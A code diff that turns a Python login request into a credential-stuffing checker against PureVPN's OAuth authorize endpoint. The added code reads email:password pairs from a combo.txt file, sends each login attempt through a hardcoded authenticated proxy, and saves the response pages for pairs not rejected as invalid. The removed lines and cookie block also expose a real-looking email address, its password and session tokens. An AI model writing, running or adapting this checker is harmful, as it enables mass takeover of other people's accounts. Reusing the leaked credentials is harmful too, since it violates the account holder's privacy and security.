@@ -1,5 +1,11 @@
 import requests
 
+# Proxy configuration
+proxies = {
+    'http': 'http://levetche:levetche@zxo.run.place:6969',
+    'https': 'http://levetche:levetche@zxo.run.place:6969',
+}
+
 cookies = {
     'fusionauth.timezone': 'Asia/Calcutta',
     'fusionauth.sso': 'AtZzqXza-QC3NlMl30tz6RvA43eMFJ0b6H_ewRD_qzO4',
@@ -23,7 +29,6 @@ headers = {
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-    # 'cookie': 'fusionauth.timezone=Asia/Calcutta; fusionauth.sso=AtZzqXza-QC3NlMl30tz6RvA43eMFJ0b6H_ewRD_qzO4; fusionauth.remember-device=QkJCAdWxuNeYQX9j9U1HHgiCoacddVf6p3VgDRN-XjWljGAO',
 }
 
 data = {
@@ -44,8 +49,56 @@ data = {
     'timezone': 'Asia/Calcutta',
     'user_code': '',
     'showPasswordField': 'true',
-    'loginId': 'bernalobezogabo@gmail.com',
-    'password': 'Gabominator260188',
 }
 
-response = requests.post('https://auth.purevpn.com/oauth2/authorize', cookies=cookies, headers=headers, data=data)
+# Read email:password combinations from combo.txt
+try:
+    with open('combo.txt', 'r') as f:
+        combos = f.readlines()
+except FileNotFoundError:
+    print("Error: combo.txt file not found!")
+    exit(1)
+
+# Test each combination
+for combo in combos:
+    combo = combo.strip()
+    if not combo or ':' not in combo:
+        continue
+    
+    # Split email:password
+    email, password = combo.split(':', 1)
+    
+    print(f"\n{'='*60}")
+    print(f"Testing: {email}")
+    print(f"{'='*60}")
+    
+    # Update credentials in data
+    data['loginId'] = email
+    data['password'] = password
+    
+    # Make the request
+    response = requests.post('https://auth.purevpn.com/oauth2/authorize', cookies=cookies, headers=headers, data=data, proxies=proxies)
+    
+    # Get the response HTML
+    html_content = response.text
+    
+    # Split into lines
+    lines = html_content.split('\n')
+    
+    # Find the line with "fa fa-exclamation-circle" and print only the 2nd line after it
+    should_save = True
+    for i, line in enumerate(lines):
+        if 'fa fa-exclamation-circle' in line:
+            if i + 2 < len(lines):
+                error_msg = lines[i+2].strip()
+                print(f"❌ FAILED: {error_msg}")
+                # Don't save if it's invalid login credentials
+                if "Invalid login credentials" in error_msg:
+                    should_save = False
+            break
+    
+    # Save response HTML to file only if not invalid credentials
+    if should_save:
+        with open(f'response_{email.replace("@", "_at_")}.html', 'w', encoding='utf-8') as f:
+            f.write(html_content)
+        print(f"Response saved to: response_{email.replace('@', '_at_')}.html")
